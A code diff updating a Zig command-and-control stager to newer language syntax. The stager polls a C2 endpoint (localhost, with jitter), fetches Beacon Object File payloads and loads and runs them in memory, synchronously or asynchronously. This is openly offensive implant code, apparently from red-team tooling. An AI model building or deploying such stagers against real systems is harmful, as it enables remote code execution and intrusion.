@@ -6,8 +6,6 @@ const c2_host = "127.0.0.1:8000";
 const c2_endpoint = "/endpoint";
 const jitter = 3;
 
-const stdout = std.io.getStdOut();
-
 const UserContext = struct {
     id: i32,
     done_event: std.Thread.ResetEvent = .{},
@@ -20,7 +18,7 @@ fn completionCallback(
 ) callconv(.C) void {
     _ = bof_handle;
     _ = run_result;
-    const context = @ptrCast(*UserContext, @alignCast(@alignOf(UserContext), user_context));
+    const context = @as(*UserContext, @ptrCast(@alignCast(user_context)));
     context.done_event.set();
 }
 
@@ -40,9 +38,11 @@ fn fetchBofContent(allocator: std.mem.Allocator, bof_uri: []const u8) ![]u8 {
     try bof_req.start();
     try bof_req.wait();
 
+    const stdout = std.io.getStdOut();
+
     if (bof_req.response.status != .ok) {
         stdout.writer().print("Expected response status '200 OK' got '{} {s}'", .{
-            @enumToInt(bof_req.response.status),
+            @intFromEnum(bof_req.response.status),
             bof_req.response.status.phrase() orelse "",
         }) catch unreachable;
         return error.sdfsdfs;
@@ -72,6 +72,8 @@ pub fn main() !u8 {
     const arch = "x86_64";
     const os = "linux";
     const authz = arch ++ ":" ++ os;
+
+    const stdout = std.io.getStdOut();
 
     stdout.writer().print("Hello! baby stager here!\n", .{}) catch unreachable;
 
@@ -104,7 +106,7 @@ pub fn main() !u8 {
 
         if (req.response.status != .ok) {
             stdout.writer().print("Expected response status '200 OK' got '{} {s}'", .{
-                @enumToInt(req.response.status),
+                @intFromEnum(req.response.status),
                 req.response.status.phrase() orelse "",
             }) catch unreachable;
             return 0;
@@ -168,9 +170,9 @@ pub fn main() !u8 {
                     _ = bof.loadAndRun(
                         "dsfsdf",
                         bof_content.ptr,
-                        @intCast(i32, bof_content.len),
+                        @as(i32, @intCast(bof_content.len)),
                         @constCast(bof_args.ptr),
-                        @intCast(i32, bof_args.len),
+                        @as(i32, @intCast(bof_args.len)),
                         &bof_handle,
                     );
                     //defer bof.unload(bof_handle);
@@ -184,15 +186,15 @@ pub fn main() !u8 {
 
                     context = UserContext{ .id = 1 };
 
-                    _ = bof.load("sgsfgr", bof_content.ptr, @intCast(c_int, bof_content.len), &bof_handle);
+                    _ = bof.load("sgsfgr", bof_content.ptr, @as(c_int, @intCast(bof_content.len)), &bof_handle);
                     //defer bof.unload(bof_handle);
 
                     _ = bof.runAsync(
                         bof_handle,
                         @constCast(bof_args.ptr),
-                        @intCast(i32, bof_args.len),
+                        @as(i32, @intCast(bof_args.len)),
                         completionCallback,
-                        @ptrCast(*UserContext, &context),
+                        @as(*UserContext, @ptrCast(&context)),
                     );
                     context.done_event.wait();
                 } else if (std.mem.eql(u8, exec_mode, "process")) {
